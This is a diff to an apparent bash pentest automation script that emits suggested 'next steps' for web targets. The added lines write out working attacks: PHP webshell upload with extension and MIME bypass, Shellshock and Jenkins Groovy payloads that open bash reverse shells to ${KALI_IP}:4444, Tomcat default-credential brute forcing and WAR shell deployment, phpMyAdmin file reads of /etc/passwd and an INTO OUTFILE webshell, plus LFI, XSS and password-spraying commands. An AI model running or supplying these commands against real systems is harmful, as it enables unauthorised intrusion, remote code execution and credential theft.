@@ -1069,15 +1069,45 @@ generate_next_steps() {
     upload_hits=$(grep -hiE '/(upload|uploads|filemanager|files|media).*(\| (200|301|302|401|403) \||\] http)' "$work_dir/content/"*.txt "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null | awk '{print $1}' | head -3)
     if [[ -n "$upload_hits" ]]; then
         local upload_cmds=()
+        local first_upload_url=""
         while IFS= read -r upload_url; do
             [[ -z "$upload_url" || "$upload_url" == \[* ]] && continue
+            [[ -z "$first_upload_url" ]] && first_upload_url="$upload_url"
             upload_cmds+=("curl -skI '${upload_url}'")
             upload_cmds+=("ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -u '${upload_url%/}/FUZZ' -mc 200,201,204,301,302,401,403")
         done <<< "$upload_hits"
+        if [[ -n "$first_upload_url" ]]; then
+            upload_cmds+=("# Extension/MIME bypass — create php shell with image extension:")
+            upload_cmds+=("echo '<?php system(\$_GET[\"cmd\"]); ?>' > /tmp/shell.php")
+            upload_cmds+=("curl -sk -F 'file=@/tmp/shell.php;type=image/jpeg' -F 'filename=shell.php.jpg' '${first_upload_url}'")
+            upload_cmds+=("curl -sk -F 'file=@/tmp/shell.php;filename=shell.php5' '${first_upload_url}'")
+            upload_cmds+=("# If upload succeeds, trigger shell:")
+            upload_cmds+=("curl -sk '${url%/}/uploads/shell.php?cmd=id'   # adjust path to where files land")
+        fi
         append_next_finding "$next_file" \
             "Upload or file-management path found" \
             "content/sensitive path output matched upload/files/media path" \
-            "${upload_cmds[@]:0:6}"
+            "${upload_cmds[@]:0:10}"
+    fi
+
+    local cgi_hits
+    cgi_hits=$(grep -hiE '/(cgi-bin|cgi)/.*(200|301|302)' "$work_dir/content/"*.txt "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null | awk '{print $1}' | head -3)
+    if [[ -n "$cgi_hits" ]]; then
+        local cgi_cmds=()
+        while IFS= read -r cgi_url; do
+            [[ -z "$cgi_url" ]] && continue
+            cgi_cmds+=("curl -skI '${cgi_url}'")
+            cgi_cmds+=("# Shellshock test (CVE-2014-6271):")
+            cgi_cmds+=("curl -sk -H 'User-Agent: () { :; }; echo; echo VULNERABLE' '${cgi_url}'")
+            cgi_cmds+=("curl -sk -H 'User-Agent: () { :; }; /bin/bash -c \"bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\"' '${cgi_url}'")
+        done <<< "$cgi_hits"
+        cgi_cmds+=("# Enumerate CGI scripts:")
+        cgi_cmds+=("ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u ${url%/}/cgi-bin/FUZZ -mc 200,301,302,403")
+        cgi_cmds+=("nmap --script http-shellshock -p $(get_port "$url") --script-args uri=/cgi-bin/test.cgi $(get_host "$url")")
+        append_next_finding "$next_file" \
+            "CGI script found — test for Shellshock" \
+            "content output matched /cgi-bin/ or /cgi/ path with 200/301/302" \
+            "${cgi_cmds[@]:0:10}"
     fi
 
     if grep -qiE 'swagger|openapi|api-docs' "$work_dir/fingerprint/sensitive_paths.txt" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
@@ -1163,8 +1193,9 @@ generate_next_steps() {
         append_next_finding "$next_file" \
             "WordPress detected" \
             "whatweb or path probes matched WordPress" \
-            "wpscan --url ${url%/} --enumerate u,vp,vt --plugins-detection aggressive" \
-            "wpscan --url ${url%/} --enumerate u --passwords /usr/share/wordlists/fasttrack.txt" \
+            "wpscan --url ${url%/} --enumerate p --plugins-detection aggressive -o /tmp/${HOST_SAFE}_wpscan_plugins.txt" \
+            "wpscan --url ${url%/} --enumerate u,vp,vt,cb --plugins-detection aggressive -o /tmp/${HOST_SAFE}_wpscan_vuln.txt" \
+            "wpscan --url ${url%/} --enumerate u --passwords /usr/share/wordlists/fasttrack.txt -o /tmp/${HOST_SAFE}_wpscan_users.txt" \
             "curl -sk ${url%/}/wp-login.php | sed -n '1,40p'"
     fi
 
@@ -1191,8 +1222,13 @@ generate_next_steps() {
             "Tomcat manager surface detected" \
             "whatweb or path probes matched Tomcat/manager" \
             "curl -skI ${url%/}/manager/html" \
-            "nxc http ${url%/} -u tomcat -p tomcat --path /manager/html" \
-            "msfvenom -p java/jsp_shell_reverse_tcp LHOST=${KALI_IP} LPORT=4444 -f war -o shell.war"
+            "curl -skI ${url%/}/manager/status" \
+            "# Brute default creds (tomcat:tomcat, admin:admin, manager:manager, tomcat:s3cret):" \
+            "hydra -L /usr/share/seclists/Usernames/tomcat-usernames.txt -P /usr/share/seclists/Passwords/tomcat-betterdefaults.txt $(get_host "$url") http-get /manager/html" \
+            "# Build + deploy WAR shell:" \
+            "msfvenom -p java/jsp_shell_reverse_tcp LHOST=${KALI_IP} LPORT=4444 -f war -o /tmp/shell.war" \
+            "curl -v -u 'tomcat:tomcat' --upload-file /tmp/shell.war '${url%/}/manager/text/deploy?path=/shell'" \
+            "curl -sk ${url%/}/shell/   # trigger deployed shell (nc -lvnp 4444)"
     fi
 
     if grep -qi 'Jenkins\|/jenkins\|/script' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
@@ -1201,6 +1237,12 @@ generate_next_steps() {
             "whatweb or path probes matched Jenkins" \
             "curl -sk ${url%/}/login | sed -n '1,80p'" \
             "curl -skI ${url%/}/script" \
+            "# If /script accessible (unauthenticated or after login) — Groovy RCE:" \
+            "curl -sk -X POST ${url%/}/script --data-urlencode 'script=println \"id\".execute().text'" \
+            "# Groovy reverse shell (update KALI_IP/PORT):" \
+            "curl -sk -X POST ${url%/}/script --data-urlencode 'script=def cmd=[\"bash\",\"-c\",\"bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\"].execute()'" \
+            "# Enumerate without auth (often accessible):" \
+            "curl -sk ${url%/}/api/json?pretty=true | jq .jobs[].name" \
             "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u ${url%/}/FUZZ -mc 200,301,302,401,403"
     fi
 
@@ -1209,7 +1251,13 @@ generate_next_steps() {
             "phpMyAdmin detected" \
             "whatweb or path probes matched phpMyAdmin" \
             "curl -sk ${url%/}/phpmyadmin/ | sed -n '1,80p'" \
-            "hydra -l root -P /usr/share/wordlists/fasttrack.txt ${url%/} http-post-form '/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:F=Cannot log in'"
+            "hydra -l root -P /usr/share/wordlists/fasttrack.txt $(get_host "$url") http-post-form '/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:F=Cannot log in'" \
+            "# After login — read files:" \
+            "# SQL> SELECT LOAD_FILE('/etc/passwd');" \
+            "# SQL> SELECT LOAD_FILE('/var/www/html/config.php');" \
+            "# After login — write webshell (need FILE privilege + know web root):" \
+            "# SQL> SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';" \
+            "curl -sk '${url%/}/shell.php?cmd=id'   # test webshell after writing"
     fi
 
     local param_lines
@@ -1220,7 +1268,11 @@ generate_next_steps() {
             local param_url
             param_url=$(echo "$param_line" | awk '{print $1}')
             [[ "$param_url" == http* ]] || continue
-            param_cmds+=("sqlmap -u '${param_url}' --batch --level 2")
+            param_cmds+=("sqlmap -u '${param_url}' --batch --level 2 --risk 2")
+            param_cmds+=("# LFI test:")
+            param_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2Fetc%2Fpasswd}'")
+            param_cmds+=("ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u '${param_url/testvalue/FUZZ}' -mr 'root:' -mc all")
+            param_cmds+=("# XSS test:")
             param_cmds+=("curl -sk '${param_url/testvalue/%3Cscript%3Ealert(1)%3C%2Fscript%3E}'")
         done <<< "$param_lines"
         append_next_finding "$next_file" \
@@ -1518,9 +1570,15 @@ generate_summary() {
         echo "## WordPress Detected"
         if grep -qi 'WordPress\|wp-login\|wp-content' "$work_dir/fingerprint/whatweb.txt" 2>/dev/null || \
            grep -qi 'wp-login\|wp-admin' "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null; then
+            local wp_host
+            wp_host=$(get_host "$url" | tr '.:' '_')
             echo "  WordPress detected — run wpscan:"
-            echo "  wpscan --url ${url} --enumerate u,vp,vt --plugins-detection aggressive"
-            echo "  wpscan --url ${url} --enumerate u --passwords /usr/share/wordlists/fasttrack.txt"
+            echo "  # 1. All plugins (find installed plugins — most important):"
+            echo "  wpscan --url ${url} --enumerate p --plugins-detection aggressive -o /tmp/${wp_host}_wpscan_plugins.txt"
+            echo "  # 2. Vulnerable plugins/themes + config backups + users:"
+            echo "  wpscan --url ${url} --enumerate u,vp,vt,cb --plugins-detection aggressive -o /tmp/${wp_host}_wpscan_vuln.txt"
+            echo "  # 3. Password spray against found users:"
+            echo "  wpscan --url ${url} --enumerate u --passwords /usr/share/wordlists/fasttrack.txt -o /tmp/${wp_host}_wpscan_users.txt"
         else
             echo "  (none detected)"
         fi
